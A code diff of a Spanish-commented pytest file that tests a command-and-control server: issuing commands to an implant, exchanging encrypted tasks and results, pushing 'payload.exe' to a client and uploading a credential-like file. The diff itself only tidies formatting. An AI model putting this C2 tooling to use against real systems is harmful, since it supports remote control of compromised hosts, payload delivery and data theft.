@@ -1,13 +1,11 @@
 # test_commands.py
-import pytest
 import base64
-import requests
 import json
 import time
+
+import requests
+from config import C2_PASS, C2_URL, C2_USER, CLIENT_ID, MALEABLE, TEST_LATENCY_TIME, decrypt_data, encrypt_data
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
-from config import C2_URL,C2_USER , C2_PASS, MALEABLE, CLIENT_ID, encrypt_data, decrypt_data, TEST_LATENCY_TIME
-
-
 
 # Deshabilitar advertencias SSL (por certificados auto-firmados)
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -38,19 +36,19 @@ def send_command_via_web(command: str):
     """Simula enviar un comando vía interfaz web /issue_command con autenticación básica"""
     data = {"client_id": CLIENT_ID, "command": command}
     # Añade el parámetro 'auth' con las credenciales
-    r = requests.post(ISSUE_COMMAND_URL, data=data, auth=(C2_USER, C2_PASS), verify=False)
-    
+    r = requests.post(ISSUE_COMMAND_URL, data=data, auth=(C2_USER, C2_PASS), verify=False)  # noqa: S501
+
     # Imprime el código de estado si es necesario para depurar
     print(f"URL: {ISSUE_COMMAND_URL}, Status Code: {r.status_code}")
-    
+
     time.sleep(TEST_LATENCY_TIME)
-    
+
     # Asegúrate de que el código de estado sea 200 (OK)
     assert r.status_code == 200
 
 def get_encrypted_command() -> str:
     """Obtiene el comando cifrado del endpoint GET"""
-    r = requests.get(COMMAND_ENDPOINT, verify=False)
+    r = requests.get(COMMAND_ENDPOINT, verify=False)  # noqa: S501
     assert r.status_code == 200
     time.sleep(TEST_LATENCY_TIME)
     return r.text  # Base64-encoded IV + CFB ciphertext
@@ -60,7 +58,7 @@ def post_result(result_data: dict):
     plaintext = json.dumps(result_data)
     encrypted = encrypt_data(plaintext.encode())
     time.sleep(TEST_LATENCY_TIME)
-    r = requests.post(RESULT_ENDPOINT, data=encrypted, verify=False, headers={"Content-Type": "application/octet-stream"})
+    r = requests.post(RESULT_ENDPOINT, data=encrypted, verify=False, headers={"Content-Type": "application/octet-stream"})  # noqa: S501
     assert r.status_code == 200
     assert r.json().get("status") == "success"
 
@@ -125,7 +123,7 @@ def test_proxy():
 def test_download():
     # Simula que el C2 pide descargar un archivo
     files = {'file': ('payload.exe', open('payload.exe', 'rb'), 'application/octet-stream')}
-    r = requests.post(f"{C2_URL}{MALEABLE}download_file", files=files, data={'client_id': CLIENT_ID}, verify=False)
+    r = requests.post(f"{C2_URL}{MALEABLE}download_file", files=files, data={'client_id': CLIENT_ID}, verify=False)  # noqa: S501
     assert r.status_code == 200
 
     # El implant debería recibir: download:payload.exe
@@ -148,7 +146,7 @@ def test_upload():
 
     # Aquí el implant sube un archivo cifrado
     file_data = b"username=admin\npassword=123456"
-    encrypted_upload = encrypt_data(file_data)
+    encrypt_data(file_data)
 
     # El C2 espera en /command/<id> un POST con JSON
     result = MOCK_RESULT.copy()
